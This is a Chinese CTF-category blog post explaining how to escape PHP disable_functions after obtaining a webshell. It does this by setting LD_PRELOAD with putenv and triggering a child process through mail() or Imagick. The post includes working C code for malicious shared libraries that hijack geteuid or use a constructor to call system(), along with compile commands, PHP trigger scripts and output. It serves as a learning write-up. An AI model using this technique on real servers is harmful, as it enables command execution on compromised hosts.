@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/">2021-10-19</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E7%BB%95%E8%BF%87/">绕过</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>使用场景：</p>
+<p>当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。</p>
+<p>无命令执行功能的 webshell 是无意义的，得突破！</p>
+<p>首先来介绍下我们需要使用的两个函数：</p>
+<p>LD_PRELOAD:</p>
+<p>google给出如下定义：</p>
+<pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+</code></pre>
+<p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p>
+<p>PUTENV函数：可以设置环境变量</p>
+<pre><code class="php">putenv ( string $setting ) : bool
+</code></pre>
+<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
+<p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so  中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p>
+<h2 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h2><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下</p>
+<p>这里简单写个demo</p>
+<pre><code class="php">&lt;?php
+mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);
+?&gt;
+</code></pre>
+<p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail</p>
+<pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0
+[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0
+[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0
+</code></pre>
+<p>那么我们只要看一下sendmail使用了哪些函数</p>
+<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p>
+<p>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c</p>
+<pre><code class="c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+        system(&quot;ls / &gt; /tmp/sky&quot;);
+&#125;
+int geteuid() 
+&#123;
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+&#125;
+</code></pre>
+<p>然后编译一下</p>
+<pre><code>gcc -c -fPIC hack.c -o hack
+gcc --share hack -o hack.so
+</code></pre>
+<p>然后我们运行脚本</p>
+<pre><code class="php">&lt;?php
+putenv(&quot;LD_PRELOAD=./hack.so&quot;);
+mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);
+?&gt;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p>
+<p>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky</p>
+<pre><code>root@sky:~# ls /tmp | grep sky
+sky
+</code></pre>
+<p>我们查看一下</p>
+<pre><code>root@sky:~# cat /tmp/sky
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+....
+</code></pre>
+<p>发现成功执行命令</p>
+<p>但是这是基于存在sendmail()这个常用函数的基础上，如果目标的sendmail()函数也被禁用了那该怎么办呢？</p>
+<p>下面来介绍改进版的：</p>
+<h2 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h2><p>已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void)&#123;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls&quot;);
+&#125;
+</code></pre>
+<p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p>
+<pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.
+2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.
+3.The destructor is run when the shared library is unloaded, typically at program exit.
+</code></pre>
+<p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p>
+<p>常考察的还有php-imagick</p>
+<p>我们发现如下对应关系</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p>
+<p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p>
+<p>我们测试一下.wmv</p>
+<p>写出脚本</p>
+<pre><code class="php">&lt;?php
+$img = new Imagick(&#39;sky.wmv&#39;);
+?&gt;
+</code></pre>
+<p>我们测试一下</p>
+<pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0
+[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0
+</code></pre>
+<p>可以发现的确成功启动了子进程，调用了ffmpeg</p>
+<p>但是如果sky.wmv文件不存在时</p>
+<pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0
+</code></pre>
+<p>则不会调用ffmpeg</p>
+<p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p>
+<p>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p>
+<p> payload &amp; attack</p>
+<p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了</p>
+<p>我们还是用之前的sky.c</p>
+<pre><code class="c">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void)&#123;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls&quot;);
+&#125;
+</code></pre>
+<p>然后编译一下</p>
+<pre><code>gcc -c -fPIC sky.c -o sky
+gcc --share sky -o sky.so
+</code></pre>
+<p>测试一下</p>
+<pre><code class="php">&lt;?php
+putenv(&quot;LD_PRELOAD=./sky.so&quot;);
+$img = new Imagick(&#39;sky.wmv&#39;);
+?&gt;
+</code></pre>
+<p>运行发现</p>
+<pre><code>root@sky:~# php sky.php
+bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.old
+PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3
+Stack trace:
+#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)
+#1 &#123;main&#125;
+  thrown in /root/sky.php on line 3
+</code></pre>
+<p>我们成功的进行了列目录</p>
+<p>这里串一下思路：</p>
+<p>首先执行sky.php ,设置了恶意环境变量。下一步我们需要调用子进程来加载环境变量，所以这里就会使用new imagick(‘sky.wmv’),调用了ffmpeg这个子进程，这个进程在加载之前就调用了环境变量，加载了共享对象sky.so.加载完后它会自动执行__attribute__ ((<strong>constructor</strong>)),就会调用system命令。</p>
+<h2 id="getflag流程"><a href="#getflag流程" class="headerlink" title="getflag流程:"></a>getflag流程:</h2><p>那么现在思路很清晰：</p>
+<p>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中</p>
+<p>2.利用backdoor运行sky.php</p>
+<p>3.在tmp目录读取重定向的结果</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> （膜拜大佬，基本都是搬过来的，自己的代码功底太弱，大佬讲的又非常好就搬运了一下）</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/">https://sakurahack-y.github.io/2021/10/19/通过LD-PRELOAD与putenv组合拳绕过disable-functions函数/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E7%BB%95%E8%BF%87/">绕过</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F-hijacking-function"><span class="toc-number">1.</span> <span class="toc-text">传统方式(hijacking function)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B%E7%89%88-hijack-shared-library"><span class="toc-number">2.</span> <span class="toc-text">改进版(hijack shared library)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getflag%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">getflag流程:</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/">极客大挑战 2019 RCE ME __0X01-0X0F &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
